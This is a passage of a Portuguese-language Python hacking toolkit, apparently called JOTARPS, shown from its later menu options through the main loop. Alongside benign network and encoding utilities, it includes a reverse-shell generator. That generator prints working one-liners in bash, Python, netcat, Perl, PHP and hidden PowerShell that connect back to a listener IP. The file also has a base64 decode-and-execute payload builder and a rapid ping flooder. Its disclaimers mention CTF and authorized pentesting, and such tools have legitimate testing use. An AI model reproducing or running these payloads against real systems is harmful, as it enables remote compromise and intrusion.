    try: hostname = socket.gethostname()
    except: hostname = "N/A"
    try: local_ip = socket.gethostbyname(hostname)
    except: local_ip = "N/A"
    try: os_info = f"{platform.system()} {platform.release()} ({platform.machine()})"
    except: os_info = "N/A"
    try: cpu = platform.processor() or platform.machine()
    except: cpu = "N/A"
    try: py_ver = platform.python_version()
    except: py_ver = "N/A"

    infos = [
        ("Hostname",    hostname),
        ("IP Local",    local_ip),
        ("OS",          os_info),
        ("CPU",         cpu),
        ("Python",      py_ver),
        ("Usuário",     getpass.getuser()),
        ("Data/Hora",   datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        ("CWD",         os.getcwd()),
    ]
    for k, v in infos:
        cprint(f"  {C.YELLOW}{k:<14}{C.RESET}  {v}")

    # interfaces
    cprint(f"\n  {C.PURPLE}Interfaces de Rede:{C.RESET}")
    try:
        import subprocess as sp
        if platform.system().lower() == "windows":
            out = sp.run(["ipconfig"], capture_output=True, text=True).stdout
        else:
            out = sp.run(["ip", "addr"], capture_output=True, text=True).stdout
        print(C.GRAY + out[:1500] + C.RESET)
    except:
        pass
    pause()

# ----------------------------------------------
# 25 - IP PÚBLICO
# ----------------------------------------------
def public_ip():
    banner()
    cprint("  == CAPTURADOR DE IP PÚBLICO ==\n", C.PURPLE + C.BOLD)
    sep()
    services = [
        "https://api.ipify.org",
        "https://api4.my-ip.io/ip",
        "https://checkip.amazonaws.com",
    ]
    for svc in services:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(svc, context=ctx, timeout=5) as r:
                ip = r.read().decode().strip()
                cprint(f"  {C.GREEN}IP Público:{C.RESET}  {C.YELLOW}{ip}{C.RESET}")
                cprint(f"  {C.GRAY}Fonte: {svc}{C.RESET}")
                pause(); return
        except:
            pass
    cprint("  [!] Não foi possível obter o IP público.", C.RED)
    pause()

# ----------------------------------------------
# 26 - MAC ADDRESS LOOKUP
# ----------------------------------------------
def mac_lookup():
    banner()
    cprint("  == MAC ADDRESS LOOKUP ==\n", C.PURPLE + C.BOLD)
    mac = input(f"  {C.CYAN}MAC Address (ex: 00:1A:2B:3C:4D:5E){C.RESET}: ").strip()
    oui = mac.replace("-",":").upper()[:8]
    sep()
    cprint(f"  {C.GREEN}MAC:{C.RESET}  {mac}")
    cprint(f"  {C.GREEN}OUI:{C.RESET}  {oui}")
    url = f"https://api.macvendors.com/{urllib.parse.quote(oui)}"
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(url, context=ctx, timeout=6) as r:
            vendor = r.read().decode().strip()
            cprint(f"  {C.GREEN}Fabricante:{C.RESET}  {C.YELLOW}{vendor}{C.RESET}")
    except:
        cprint(f"  {C.YELLOW}Fabricante:{C.RESET}  Não encontrado (API indisponível)")
    pause()

# ----------------------------------------------
# 27 - ANALISADOR DE ARQUIVO
# ----------------------------------------------
def file_analyzer():
    banner()
    cprint("  == ANALISADOR DE ARQUIVO (HEX/STRINGS) ==\n", C.PURPLE + C.BOLD)
    path = input(f"  {C.CYAN}Caminho do arquivo{C.RESET}: ").strip()
    if not os.path.exists(path):
        cprint("  [!] Arquivo não encontrado.", C.RED); pause(); return
    sep()
    size = os.path.getsize(path)
    cprint(f"  {C.GREEN}Tamanho:{C.RESET}   {size} bytes")
    with open(path, "rb") as f:
        raw = f.read(512)
    magic = raw[:4].hex().upper()
    cprint(f"  {C.GREEN}Magic:{C.RESET}     {magic}")
    md5h = hashlib.md5(open(path,"rb").read()).hexdigest()
    sha256h = hashlib.sha256(open(path,"rb").read()).hexdigest()
    cprint(f"  {C.GREEN}MD5:{C.RESET}       {md5h}")
    cprint(f"  {C.GREEN}SHA256:{C.RESET}    {sha256h}")
    cprint(f"\n  {C.YELLOW}=== HEX DUMP (primeiros 256 bytes) ==={C.RESET}")
    for i in range(0, min(256, len(raw)), 16):
        chunk = raw[i:i+16]
        hex_part = " ".join(f"{b:02X}" for b in chunk).ljust(48)
        asc_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"  {C.GRAY}{i:04X}{C.RESET}  {C.CYAN}{hex_part}{C.RESET}  {C.WHITE}{asc_part}{C.RESET}")
    cprint(f"\n  {C.YELLOW}=== STRINGS (min 6 chars) ==={C.RESET}")
    with open(path, "rb") as f:
        content = f.read()
    strings = re.findall(b"[ -~]{6,}", content)
    for s in strings[:40]:
        cprint(f"  {C.GRAY}>{C.RESET} {s.decode(errors='ignore')}")
    pause()

# ----------------------------------------------
# 28 - CONEXÕES ATIVAS
# ----------------------------------------------
def active_connections():
    banner()
    cprint("  == LOG DE CONEXÕES ATIVAS ==\n", C.PURPLE + C.BOLD)
    sep()
    cmd = "netstat -tunap" if platform.system().lower() != "windows" else "netstat -ano"
    try:
        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=10)
        lines = result.stdout.strip().split("\n")
        for line in lines[:60]:
            if "ESTABLISHED" in line:
                cprint(f"  {C.GREEN}{line}{C.RESET}")
            elif "LISTEN" in line:
                cprint(f"  {C.CYAN}{line}{C.RESET}")
            elif line.strip():
                cprint(f"  {C.GRAY}{line}{C.RESET}")
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 29 - GERADOR DE PAYLOAD BASE64
# ----------------------------------------------
def payload_b64():
    banner()
    cprint("  == GERADOR DE PAYLOAD BASE64 ==\n", C.PURPLE + C.BOLD)
    cprint("  [Uso educacional / CTF / pentest autorizado]\n", C.GRAY)
    cmd = input(f"  {C.CYAN}Comando a encodar (ex: id){C.RESET}: ").strip()
    lang = input(f"  {C.CYAN}Linguagem [1=bash 2=python 3=php]{C.RESET}: ").strip()
    sep()
    encoded = base64.b64encode(cmd.encode()).decode()
    if lang == "1":
        payload = f'echo "{encoded}" | base64 -d | bash'
    elif lang == "2":
        payload = f'python3 -c \'import base64,os; os.system(base64.b64decode("{encoded}").decode())\''
    elif lang == "3":
        payload = f'<?php system(base64_decode("{encoded}")); ?>'
    else:
        payload = encoded
    cprint(f"  {C.GREEN}Encoded:{C.RESET}\n  {encoded}\n")
    cprint(f"  {C.YELLOW}Payload:{C.RESET}\n  {payload}")
    pause()

# ----------------------------------------------
# 30 - IP GEOLOCATION
# ----------------------------------------------
def ip_geolocation():
    banner()
    cprint("  == IP GEOLOCATION ==\n", C.PURPLE + C.BOLD)
    ip = input(f"  {C.CYAN}IP (ou ENTER para seu IP){C.RESET}: ").strip() or ""
    url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,lat,lon,timezone,query"
    sep()
    try:
        with urllib.request.urlopen(url, timeout=8) as r:
            data = json.loads(r.read().decode())
        if data.get("status") == "success":
            fields = ["query","country","regionName","city","isp","org","timezone","lat","lon"]
            labels = ["IP","País","Estado","Cidade","ISP","Org","Timezone","Latitude","Longitude"]
            for key, label in zip(fields, labels):
                cprint(f"  {C.YELLOW}{label:<12}{C.RESET}  {data.get(key,'N/A')}")
        else:
            cprint(f"  [!] {data.get('message','Erro desconhecido')}", C.RED)
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 31 - PING FLOOD TESTER
# ----------------------------------------------
def ping_flood():
    banner()
    cprint("  == PING FLOOD TESTER (LOCAL/CTF) ==\n", C.PURPLE + C.BOLD)
    cprint("  [!] Use apenas em redes próprias ou com autorização escrita.", C.RED)
    confirm = input(f"  {C.CYAN}Confirmar uso responsável? [sim/nao]{C.RESET}: ").strip().lower()
    if confirm != "sim":
        cprint("  Operação cancelada.", C.YELLOW); pause(); return
    host  = input(f"  {C.CYAN}Host/IP alvo{C.RESET}: ").strip()
    count = input(f"  {C.CYAN}Pacotes (ex: 100){C.RESET}: ").strip()
    count = int(count) if count.isdigit() else 50
    sep()
    param = "-n" if platform.system().lower() == "windows" else "-c"
    cmd = ["ping", param, str(count), "-i", "0.1", host]
    cprint(f"  [*] Enviando {count} pings rápidos para {host}...\n", C.GREEN)
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        lines = proc.stdout.strip().split("\n")
        for line in lines[-8:]:
            cprint(f"  {line}", C.WHITE)
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 32 - REVERSE SHELL GENERATOR
# ----------------------------------------------
def rev_shell_gen():
    banner()
    cprint("  == REVERSE SHELL GENERATOR ==\n", C.PURPLE + C.BOLD)
    cprint("  [Uso: CTF / pentest com autorização]\n", C.GRAY)
    ip   = input(f"  {C.CYAN}Seu IP (listener){C.RESET}: ").strip()
    port = input(f"  {C.CYAN}Porta{C.RESET}: ").strip()
    sep()
    shells = {
        "Bash":      f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Python3":   f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
        "Netcat":    f"nc -e /bin/bash {ip} {port}",
        "Netcat-mk": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f",
        "Perl":      f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'",
        "PHP":       f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
        "PowerShell":f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sb2=$sendback+\"PS \"+(pwd).Path+\"> \";$sb=$([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sb,0,$sb.Length);$stream.Flush()}};$client.Close()",
    }
    for name, cmd in shells.items():
        cprint(f"\n  {C.YELLOW}[ {name} ]{C.RESET}")
        cprint(f"  {cmd}", C.WHITE)
    cprint(f"\n  {C.CYAN}Listener:{C.RESET}  nc -lvnp {port}")
    pause()

# ----------------------------------------------
# 33 - ENCODER DE URL
# ----------------------------------------------
def url_encoder():
    banner()
    cprint("  == ENCODER DE URL ==\n", C.PURPLE + C.BOLD)
    mode = input(f"  {C.CYAN}[1] Encode  [2] Decode{C.RESET}: ").strip()
    text = input(f"  {C.CYAN}Texto{C.RESET}: ").strip()
    sep()
    if mode == "1":
        cprint(f"  {C.GREEN}URL Encoded:{C.RESET}\n  {urllib.parse.quote(text)}")
        cprint(f"  {C.GREEN}Full Encode:{C.RESET}\n  {urllib.parse.quote_plus(text)}")
    else:
        cprint(f"  {C.GREEN}Decoded:{C.RESET}\n  {urllib.parse.unquote(text)}")
    pause()

# ----------------------------------------------
# 34 - DECODER JWT
# ----------------------------------------------
def jwt_decoder():
    banner()
    cprint("  == DECODER JWT ==\n", C.PURPLE + C.BOLD)
    token = input(f"  {C.CYAN}Token JWT{C.RESET}: ").strip()
    sep()
    parts = token.split(".")
    if len(parts) < 2:
        cprint("  [!] Token inválido (esperado formato x.y.z)", C.RED); pause(); return
    def decode_part(p):
        p += "=" * (-len(p) % 4)
        try:
            decoded = base64.urlsafe_b64decode(p).decode()
            return json.loads(decoded)
        except:
            return base64.urlsafe_b64decode(p).hex()
    header  = decode_part(parts[0])
    payload = decode_part(parts[1])
    cprint(f"  {C.YELLOW}=== HEADER ==={C.RESET}")
    if isinstance(header, dict):
        for k, v in header.items():
            cprint(f"  {C.CYAN}{k}:{C.RESET}  {v}")
    else:
        cprint(f"  {header}")
    cprint(f"\n  {C.YELLOW}=== PAYLOAD ==={C.RESET}")
    if isinstance(payload, dict):
        for k, v in payload.items():
            if k in ["exp","iat","nbf"]:
                try:
                    dt = datetime.fromtimestamp(v).strftime("%Y-%m-%d %H:%M:%S")
                    cprint(f"  {C.CYAN}{k}:{C.RESET}  {v}  {C.GRAY}({dt}){C.RESET}")
                    continue
                except: pass
            cprint(f"  {C.CYAN}{k}:{C.RESET}  {v}")
    else:
        cprint(f"  {payload}")
    cprint(f"\n  {C.YELLOW}=== ASSINATURA ==={C.RESET}")
    cprint(f"  {C.GRAY}{parts[2][:60]}...{C.RESET}" if len(parts[2]) > 60 else f"  {C.GRAY}{parts[2]}{C.RESET}")
    cprint(f"\n  {C.RED}[!] Assinatura NÃO verificada (apenas decodificação){C.RESET}")
    pause()

# ----------------------------------------------
# DISPATCH TABLE
# ----------------------------------------------
ACTIONS = {
    "1":  port_scanner,
    "2":  ping_sweep,
    "3":  traceroute,
    "4":  dns_lookup,
    "5":  whois_lookup,
    "6":  banner_grabber,
    "7":  http_headers,
    "8":  subnet_calc,
    "9":  subdomain_finder,
    "10": dir_bruteforce,
    "11": url_fuzzer,
    "12": tech_fingerprint,
    "13": link_extractor,
    "14": hash_generator,
    "15": hash_cracker,
    "16": base64_tool,
    "17": rot13_tool,
    "18": xor_cipher,
    "19": caesar_cipher,
    "20": password_gen,
    "21": wordlist_gen,
    "22": password_strength,
    "23": leet_mutator,
    "24": sys_info,
    "25": public_ip,
    "26": mac_lookup,
    "27": file_analyzer,
    "28": active_connections,
    "29": payload_b64,
    "30": ip_geolocation,
    "31": ping_flood,
    "32": rev_shell_gen,
    "33": url_encoder,
    "34": jwt_decoder,
    "35": None,  # EXIT
}

# ----------------------------------------------
# MAIN LOOP
# ----------------------------------------------
def main():
    if platform.system().lower() != "windows":
        try:
            import readline
        except:
            pass

    while True:
        try:
            choice = menu()
            if choice == "35":
                clr()
                cprint(f"\n  {C.PURPLE}{C.RESET} JOTARPS encerrado. Stay safe. {C.PURPLE}{C.RESET}\n", C.WHITE)
                sys.exit(0)
            action = ACTIONS.get(choice)
            if action:
                action()
            elif choice.strip() == "":
                continue
            else:
                banner()
                cprint(f"  {C.RED}[!] Opção inválida: {choice}{C.RESET}")
                pause()
        except KeyboardInterrupt:
            clr()
            cprint(f"\n  {C.YELLOW}[!] Interrompido. Digite 35 para sair corretamente.{C.RESET}\n")
            pause()

if __name__ == "__main__":
    main()
